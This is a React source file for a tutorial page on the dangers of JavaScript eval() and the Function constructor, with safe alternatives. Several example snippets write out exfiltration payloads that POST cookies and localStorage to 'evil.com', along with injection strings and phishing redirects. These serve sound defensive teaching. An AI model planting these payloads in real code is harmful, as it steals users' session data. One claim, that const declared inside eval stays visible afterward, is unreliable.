'use client';

import React from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { PageHeader } from '@/components/shared/generic-page-header';
import { CodeSnippet } from '@/components/shared/code-snippet';
import {
  Sparkles,
  AlertTriangle,
  Shield,
  XCircle,
  CheckCircle,
  Code2,
  Lock,
} from 'lucide-react';

export default function JavaScriptEvalFunctionConstructor() {
  return (
    <div className="w-full space-y-8 pb-16">
      <PageHeader
        icon={AlertTriangle}
        category="JavaScript Security"
        title="eval() & Function Constructor"
        description="Understanding dynamic code execution and security risks"
        colorTheme="yellow"
      />

      {/* Security Warning */}
      <Alert className="border-2 border-red-500 dark:border-red-700 bg-gradient-to-br from-red-50 to-orange-50 dark:from-red-950/20 dark:to-orange-950/10">
        <Shield className="h-6 w-6 text-red-600 dark:text-red-400" />
        <AlertTitle className="text-xl text-red-900 dark:text-red-100">⚠️ Security Critical</AlertTitle>
        <AlertDescription className="text-base text-red-800 dark:text-red-200">
          <strong>eval() is dangerous!</strong> Never use it with untrusted input. It executes arbitrary code and can lead to security vulnerabilities, XSS attacks, and code injection. Modern JavaScript provides safer alternatives.
        </AlertDescription>
      </Alert>

      {/* What is eval() */}
      <Card className="border-0 shadow-sm bg-gradient-to-br from-orange-50/50 via-red-50/30 to-pink-50/20 dark:from-orange-950/10 dark:via-red-950/5 dark:to-pink-950/5">
        <CardContent className="pt-8 space-y-6">
          <div className="flex items-start gap-4">
            <div className="p-3 rounded-2xl bg-gradient-to-br from-orange-400 to-red-500 text-white shadow-lg">
              <Code2 className="w-6 h-6" />
            </div>
            <div className="flex-1">
              <h3 className="text-2xl font-bold mb-3 text-gray-900 dark:text-gray-100">
                What is eval()?
              </h3>
              <p className="text-lg leading-relaxed text-gray-700 dark:text-gray-300">
                <code className="text-orange-700 dark:text-orange-400 bg-orange-100 dark:bg-orange-900/30 px-2 py-1 rounded">eval()</code> executes a string as JavaScript code. While powerful, it's <strong className="text-red-700 dark:text-red-400">extremely dangerous</strong> and should be avoided in production code.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      <CodeSnippet
        title="Example 1: Basic eval() Usage"
        description="How eval() works (don't use in production!)"
        code={`// eval() executes string as code
const result = eval('2 + 2');
console.log(result); // 4

// Can execute any JavaScript
eval('console.log("Hello from eval")'); // Hello from eval

// Can access variables in scope
const x = 10;
const y = eval('x * 2');
console.log(y); // 20

// Can define new variables
eval('const z = 100');
console.log(z); // 100

// ⚠️ DANGER: User input example
const userInput = '2 + 2';
const result2 = eval(userInput); // NEVER DO THIS!
// What if userInput is: "window.location='evil.com'"?
// Or: "fetch('evil.com', {method:'POST', body:localStorage})"?
// Or: "while(true){}" // Infinite loop!`}
        language="javascript"
        colorTheme="red"
      />

      {/* Security Risks */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-red-100 dark:bg-red-900/30">
              <XCircle className="w-5 h-5 text-red-600 dark:text-red-400" />
            </div>
            <div>
              <CardTitle>Security Risks of eval()</CardTitle>
              <CardDescription>Why eval() is dangerous</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid md:grid-cols-2 gap-4">
            <div className="p-5 rounded-xl bg-red-50 dark:bg-red-950/20 border-2 border-red-200 dark:border-red-800/30">
              <h4 className="font-bold text-red-900 dark:text-red-100 mb-3 flex items-center gap-2">
                <span className="text-2xl">🔓</span>
                Code Injection
              </h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-2">
                Attacker can inject malicious code
              </p>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded border border-red-300 dark:border-red-700 overflow-x-auto">
{`// User input: "'; alert('XSS'); ''"
eval("message = '" + userInput + "'");
// Executes alert('XSS')!`}</pre>
            </div>

            <div className="p-5 rounded-xl bg-orange-50 dark:bg-orange-950/20 border-2 border-orange-200 dark:border-orange-800/30">
              <h4 className="font-bold text-orange-900 dark:text-orange-100 mb-3 flex items-center gap-2">
                <span className="text-2xl">🔐</span>
                Data Theft
              </h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-2">
                Access to all variables and data
              </p>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded border border-orange-300 dark:border-orange-700 overflow-x-auto">
{`// Attacker input:
const attack = "fetch('evil.com', {
  method: 'POST',
  body: JSON.stringify(localStorage)
})";
eval(attack); // Sends all data!`}</pre>
            </div>

            <div className="p-5 rounded-xl bg-amber-50 dark:bg-amber-950/20 border-2 border-amber-200 dark:border-amber-800/30">
              <h4 className="font-bold text-amber-900 dark:text-amber-100 mb-3 flex items-center gap-2">
                <span className="text-2xl">⚡</span>
                Performance Issues
              </h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-2">
                Prevents optimization
              </p>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded border border-amber-300 dark:border-amber-700 overflow-x-auto">
{`// Cannot be optimized by JS engine
for (let i = 0; i < 1000; i++) {
  eval('const x = i * 2');
}
// Very slow!`}</pre>
            </div>

            <div className="p-5 rounded-xl bg-yellow-50 dark:bg-yellow-950/20 border-2 border-yellow-200 dark:border-yellow-800/30">
              <h4 className="font-bold text-yellow-900 dark:text-yellow-100 mb-3 flex items-center gap-2">
                <span className="text-2xl">🐛</span>
                Hard to Debug
              </h4>
              <p className="text-sm text-gray-700 dark:text-gray-300 mb-2">
                Stack traces are unclear
              </p>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded border border-yellow-300 dark:border-yellow-700 overflow-x-auto">
{`try {
  eval('undefinedFunc()');
} catch (e) {
  console.log(e.stack);
  // Cryptic stack trace!
}`}</pre>
            </div>
          </div>
        </CardContent>
      </Card>

      <CodeSnippet
        title="Example 2: Real Attack Scenarios"
        description="What attackers can do with eval()"
        code={`// Scenario 1: XSS Attack
const userComment = "'; alert(document.cookie); '";
eval("const comment = '" + userComment + "'");
// Executes: const comment = ''; alert(document.cookie); ''
// Steals cookies!

// Scenario 2: Data Exfiltration
const userInput = \`
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage,
      sessionStorage: sessionStorage
    })
  })
\`;
eval(userInput); // Sends all sensitive data!

// Scenario 3: Privilege Escalation
const malicious = \`
  // Change user role to admin
  localStorage.setItem('userRole', 'admin');
  localStorage.setItem('isAdmin', 'true');
\`;
eval(malicious); // User becomes admin!

// Scenario 4: Infinite Loop / DoS
const dos = "while(true){}";
eval(dos); // Freezes browser!

// Scenario 5: Redirect Attack
const redirect = "window.location = 'https://phishing-site.com'";
eval(redirect); // Redirects to malicious site!`}
        language="javascript"
        colorTheme="red"
      />

      {/* Function Constructor */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-purple-100 dark:bg-purple-900/30">
              <Code2 className="w-5 h-5 text-purple-600 dark:text-purple-400" />
            </div>
            <div>
              <CardTitle>Function Constructor</CardTitle>
              <CardDescription>Similar to eval() - also dangerous</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <Alert className="bg-amber-50 dark:bg-amber-950/20 border-amber-200 dark:border-amber-800/30 mb-4">
            <AlertTriangle className="h-5 w-5 text-amber-600 dark:text-amber-400" />
            <AlertTitle>Also Dangerous!</AlertTitle>
            <AlertDescription>
              Function constructor has the same security risks as eval(). Avoid using it with untrusted input.
            </AlertDescription>
          </Alert>

          <div className="grid lg:grid-cols-2 gap-6">
            {/* Function Constructor */}
            <div className="rounded-xl border-2 border-orange-200 dark:border-orange-800/30 overflow-hidden">
              <div className="bg-orange-100 dark:bg-orange-900/30 px-4 py-3 border-b-2 border-orange-200 dark:border-orange-800/30">
                <h4 className="font-semibold text-orange-700 dark:text-orange-300">⚠️ Function Constructor</h4>
              </div>
              <div className="bg-slate-50 dark:bg-slate-950 p-5">
                <pre className="font-mono text-sm text-gray-800 dark:text-gray-200 leading-relaxed">
{`// Creating function from string
const fn = new Function('a', 'b', 
  'return a + b'
);

console.log(fn(2, 3)); // 5

// Same security issues as eval!
const userCode = "alert('XSS')";
const dangerous = new Function(userCode);
dangerous(); // Executes attack!`}</pre>
              </div>
            </div>

            {/* Same Risks */}
            <div className="rounded-xl border-2 border-red-200 dark:border-red-800/30 overflow-hidden">
              <div className="bg-red-100 dark:bg-red-900/30 px-4 py-3 border-b-2 border-red-200 dark:border-red-800/30">
                <h4 className="font-semibold text-red-700 dark:text-red-300">❌ Same Security Risks</h4>
              </div>
              <div className="bg-slate-50 dark:bg-slate-950 p-5">
                <pre className="font-mono text-sm text-gray-800 dark:text-gray-200 leading-relaxed">
{`// All eval() attacks work here too!
const attack1 = new Function(
  "fetch('evil.com')"
);

const attack2 = new Function(
  "window.location='phishing.com'"
);

// Never use with user input!`}</pre>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      <CodeSnippet
        title="Example 3: Function Constructor Examples"
        description="How it works (still dangerous!)"
        code={`// Basic usage
const add = new Function('a', 'b', 'return a + b');
console.log(add(5, 3)); // 8

// Multiple parameters
const greet = new Function('name', 'age',
  'return "Hello, " + name + "! You are " + age;'
);
console.log(greet('Alice', 25)); // Hello, Alice! You are 25

// No parameters
const getRandom = new Function('return Math.random()');
console.log(getRandom()); // Random number

// Same scope issues as eval
const x = 10;
const testScope = new Function('return x'); // ❌ Error: x is not defined
// Function constructor doesn't have access to local scope!

// But can access global scope
globalThis.y = 20;
const testGlobal = new Function('return y');
console.log(testGlobal()); // 20

// ⚠️ Security risk with user input
const userFormula = "a * b + 100";
const calculate = new Function('a', 'b', 'return ' + userFormula);
// DANGEROUS if userFormula comes from user!`}
        language="javascript"
        colorTheme="purple"
      />

      {/* Safe Alternatives */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-green-100 dark:bg-green-900/30">
              <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400" />
            </div>
            <div>
              <CardTitle>Safe Alternatives to eval()</CardTitle>
              <CardDescription>Modern, secure solutions</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-3">
            <div className="p-4 rounded-lg bg-gradient-to-r from-blue-50 to-cyan-50 dark:from-blue-950/20 dark:to-cyan-950/20 border-l-4 border-blue-500">
              <h4 className="font-semibold text-blue-900 dark:text-blue-100 mb-2">1. JSON.parse() for Data</h4>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded mt-2 overflow-x-auto">
{`// ❌ BAD: Using eval for JSON
const data = eval('(' + jsonString + ')');

// ✅ GOOD: Use JSON.parse
const data = JSON.parse(jsonString);`}</pre>
            </div>

            <div className="p-4 rounded-lg bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-950/20 dark:to-emerald-950/20 border-l-4 border-green-500">
              <h4 className="font-semibold text-green-900 dark:text-green-100 mb-2">2. Object Property Access</h4>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded mt-2 overflow-x-auto">
{`// ❌ BAD: Using eval
const value = eval('obj.' + property);

// ✅ GOOD: Use bracket notation
const value = obj[property];`}</pre>
            </div>

            <div className="p-4 rounded-lg bg-gradient-to-r from-purple-50 to-pink-50 dark:from-purple-950/20 dark:to-pink-950/20 border-l-4 border-purple-500">
              <h4 className="font-semibold text-purple-900 dark:text-purple-100 mb-2">3. Template Literals</h4>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded mt-2 overflow-x-auto">
{`// ❌ BAD: Eval for string construction
const msg = eval(\`"Hello, " + name + "!"\`);

// ✅ GOOD: Use template literals
const msg = \`Hello, \${name}!\`;`}</pre>
            </div>

            <div className="p-4 rounded-lg bg-gradient-to-r from-amber-50 to-orange-50 dark:from-amber-950/20 dark:to-orange-950/20 border-l-4 border-amber-500">
              <h4 className="font-semibold text-amber-900 dark:text-amber-100 mb-2">4. Switch/Object Map for Logic</h4>
              <pre className="font-mono text-xs bg-white dark:bg-slate-900 p-3 rounded mt-2 overflow-x-auto">
{`// ❌ BAD: Eval for operations
const result = eval(\`\${a} \${operator} \${b}\`);

// ✅ GOOD: Use object map
const operations = {
  '+': (a, b) => a + b,
  '-': (a, b) => a - b,
  '*': (a, b) => a * b,
  '/': (a, b) => a / b
};
const result = operations[operator](a, b);`}</pre>
            </div>
          </div>
        </CardContent>
      </Card>

      <CodeSnippet
        title="Example 4: Safe Calculator Implementation"
        description="Building a calculator without eval()"
        code={`// ❌ UNSAFE: Calculator with eval
function unsafeCalculator(expression) {
  return eval(expression); // NEVER DO THIS!
}

// ✅ SAFE: Calculator with operation map
function safeCalculator(a, operator, b) {
  // Validate inputs
  if (typeof a !== 'number' || typeof b !== 'number') {
    throw new Error('Operands must be numbers');
  }
  
  // Whitelist of operations
  const operations = {
    '+': (x, y) => x + y,
    '-': (x, y) => x - y,
    '*': (x, y) => x * y,
    '/': (x, y) => {
      if (y === 0) throw new Error('Division by zero');
      return x / y;
    },
    '%': (x, y) => x % y,
    '**': (x, y) => x ** y
  };
  
  // Check if operation is allowed
  if (!operations[operator]) {
    throw new Error('Invalid operator');
  }
  
  return operations[operator](a, b);
}

// Usage
console.log(safeCalculator(10, '+', 5));  // 15
console.log(safeCalculator(10, '*', 5));  // 50
console.log(safeCalculator(10, '/', 2));  // 5

// Safely handles invalid input
try {
  safeCalculator(10, 'alert', 5); // Throws error
} catch (e) {
  console.error(e.message); // Invalid operator
}`}
        language="javascript"
        colorTheme="green"
      />

      <CodeSnippet
        title="Example 5: Safe Expression Parser"
        description="Parse and evaluate math expressions safely"
        code={`// Safe expression parser (simple version)
function parseExpression(expr) {
  // Remove whitespace
  expr = expr.replace(/\\s+/g, '');
  
  // Validate: only numbers and operators
  if (!/^[\\d+\\-*/().]+$/.test(expr)) {
    throw new Error('Invalid characters in expression');
  }
  
  // Parse and calculate
  return Function('"use strict"; return (' + expr + ')')();
}

// Better: Use a proper math parser library
// Like: math.js, expr-eval, etc.

// Example with validation
function safeEvaluate(expr) {
  // Whitelist approach
  const allowedChars = /^[\\d+\\-*/().\\s]+$/;
  
  if (!allowedChars.test(expr)) {
    throw new Error('Expression contains invalid characters');
  }
  
  // Limit length to prevent DoS
  if (expr.length > 100) {
    throw new Error('Expression too long');
  }
  
  try {
    // Use Function (still risky, but more controlled)
    return Function('"use strict"; return (' + expr + ')')();
  } catch (e) {
    throw new Error('Invalid expression: ' + e.message);
  }
}

// Usage
console.log(safeEvaluate('2 + 2'));      // 4
console.log(safeEvaluate('(10 + 5) * 2')); // 30

// Rejects dangerous input
try {
  safeEvaluate('alert(1)'); // Throws error
} catch (e) {
  console.error(e.message);
}`}
        language="javascript"
        colorTheme="blue"
      />

      <CodeSnippet
        title="Example 6: Sandboxed Execution (Advanced)"
        description="Using Web Workers for isolation (most secure)"
        code={`// Create sandboxed execution environment
function executeSandboxed(code) {
  return new Promise((resolve, reject) => {
    // Create worker from blob
    const workerCode = \`
      self.onmessage = function(e) {
        try {
          const result = Function(e.data)();
          self.postMessage({ success: true, result });
        } catch (error) {
          self.postMessage({ success: false, error: error.message });
        }
      };
    \`;
    
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    
    // Set timeout
    const timeout = setTimeout(() => {
      worker.terminate();
      reject(new Error('Execution timeout'));
    }, 5000);
    
    worker.onmessage = (e) => {
      clearTimeout(timeout);
      worker.terminate();
      
      if (e.data.success) {
        resolve(e.data.result);
      } else {
        reject(new Error(e.data.error));
      }
    };
    
    worker.onerror = (error) => {
      clearTimeout(timeout);
      worker.terminate();
      reject(error);
    };
    
    worker.postMessage(code);
  });
}

// Usage
executeSandboxed('return 2 + 2')
  .then(result => console.log('Result:', result)) // 4
  .catch(error => console.error('Error:', error));

// Worker has no access to:
// - DOM
// - Main thread variables
// - localStorage
// - Cookies
// Much safer!`}
        language="javascript"
        colorTheme="cyan"
      />

      {/* When eval() Might Be Acceptable */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-amber-100 dark:bg-amber-900/30">
              <AlertTriangle className="w-5 h-5 text-amber-600 dark:text-amber-400" />
            </div>
            <div>
              <CardTitle>When eval() Might Be Acceptable</CardTitle>
              <CardDescription>Very rare, controlled scenarios only</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-4">
          <Alert className="bg-blue-50 dark:bg-blue-950/20 border-blue-200 dark:border-blue-800/30">
            <Lock className="h-5 w-5 text-blue-600 dark:text-blue-400" />
            <AlertTitle>Strict Requirements</AlertTitle>
            <AlertDescription>
              Only consider eval() if ALL of these are true:
            </AlertDescription>
          </Alert>

          <div className="space-y-2">
            <div className="p-3 bg-white dark:bg-slate-900 rounded-lg border border-gray-200 dark:border-gray-800">
              <CheckCircle className="inline w-4 h-4 text-green-600 dark:text-green-400 mr-2" />
              <span className="text-sm">Code is <strong>completely under your control</strong> (no user input)</span>
            </div>
            <div className="p-3 bg-white dark:bg-slate-900 rounded-lg border border-gray-200 dark:border-gray-800">
              <CheckCircle className="inline w-4 h-4 text-green-600 dark:text-green-400 mr-2" />
              <span className="text-sm">You're building a <strong>code playground/REPL</strong> (like JSFiddle)</span>
            </div>
            <div className="p-3 bg-white dark:bg-slate-900 rounded-lg border border-gray-200 dark:border-gray-800">
              <CheckCircle className="inline w-4 h-4 text-green-600 dark:text-green-400 mr-2" />
              <span className="text-sm">Running in an <strong>isolated sandbox</strong> (Web Worker, iframe)</span>
            </div>
            <div className="p-3 bg-white dark:bg-slate-900 rounded-lg border border-gray-200 dark:border-gray-800">
              <CheckCircle className="inline w-4 h-4 text-green-600 dark:text-green-400 mr-2" />
              <span className="text-sm">You have <strong>no alternative</strong> (extremely rare)</span>
            </div>
          </div>

          <p className="text-sm text-gray-600 dark:text-gray-400 italic">
            Examples: Browser DevTools console, online code editors (CodePen, JSBin), Node.js REPL
          </p>
        </CardContent>
      </Card>

      {/* Best Practices */}
      <Card>
        <CardHeader>
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-emerald-100 dark:bg-emerald-900/30">
              <Sparkles className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
            </div>
            <div>
              <CardTitle>Security Best Practices</CardTitle>
              <CardDescription>Protect your application</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="p-4 rounded-lg bg-gradient-to-r from-red-50 to-orange-50 dark:from-red-950/20 dark:to-orange-950/20 border-l-4 border-red-500">
            <h4 className="font-semibold text-red-900 dark:text-red-100 mb-2">❌ Never Do This</h4>
            <ul className="space-y-1 text-sm text-gray-700 dark:text-gray-300">
              <li>• Never use eval() with user input</li>
              <li>• Never trust client-side validation</li>
              <li>• Never execute unvalidated code</li>
              <li>• Never use new Function() with user input</li>
            </ul>
          </div>

          <div className="p-4 rounded-lg bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-950/20 dark:to-emerald-950/20 border-l-4 border-green-500">
            <h4 className="font-semibold text-green-900 dark:text-green-100 mb-2">✅ Always Do This</h4>
            <ul className="space-y-1 text-sm text-gray-700 dark:text-gray-300">
              <li>• Use JSON.parse() for data</li>
              <li>• Use bracket notation for dynamic properties</li>
              <li>• Validate and sanitize all inputs</li>
              <li>• Use whitelist approach for operations</li>
              <li>• Implement Content Security Policy (CSP)</li>
              <li>• Use sandboxed environments (Workers) if needed</li>
            </ul>
          </div>
        </CardContent>
      </Card>

      {/* Key Takeaways */}
      <Card className="border-2 border-red-300 dark:border-red-700 bg-gradient-to-br from-red-50 via-orange-50 to-amber-50 dark:from-red-950/20 dark:via-orange-950/10 dark:to-amber-950/10 shadow-lg">
        <CardContent className="pt-8">
          <div className="flex items-center gap-3 mb-6">
            <div className="p-3 rounded-xl bg-gradient-to-br from-red-400 to-orange-500 text-white shadow-lg">
              <Shield className="w-6 h-6" />
            </div>
            <h3 className="text-2xl font-bold text-gray-900 dark:text-gray-100">Key Takeaways</h3>
          </div>
          
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">🚨</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">eval() is Dangerous</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Never use with user input<br/>
                    Causes security vulnerabilities
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">⚠️</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Function Constructor Too</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Same risks as eval()<br/>
                    Avoid in production code
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">✅</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Use Safe Alternatives</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    JSON.parse(), bracket notation<br/>
                    Template literals, object maps
                  </p>
                </div>
              </div>
            </div>

            <div className="p-5 rounded-xl bg-white dark:bg-slate-900 border-2 border-red-200 dark:border-red-800/30">
              <div className="flex items-start gap-3">
                <span className="text-3xl">🛡️</span>
                <div>
                  <h4 className="font-semibold mb-1.5 text-gray-900 dark:text-gray-100">Security First</h4>
                  <p className="text-sm text-gray-600 dark:text-gray-400">
                    Always validate input<br/>
                    Use CSP and sandboxing
                  </p>
                </div>
              </div>
            </div>
          </div>

          <Alert className="mt-6 bg-gradient-to-r from-red-100 to-orange-100 dark:from-red-950/30 dark:to-orange-950/30 border-red-300 dark:border-red-700">
            <AlertTriangle className="h-5 w-5 text-red-600 dark:text-red-400" />
            <AlertTitle className="text-red-900 dark:text-red-100">Critical Security Rule</AlertTitle>
            <AlertDescription className="text-gray-700 dark:text-gray-300">
              <strong>NEVER</strong> use <code>eval()</code> or <code>new Function()</code> with any user-provided input. Period. No exceptions. Use modern, safe alternatives instead.
            </AlertDescription>
          </Alert>
        </CardContent>
      </Card>
    </div>
  );
}
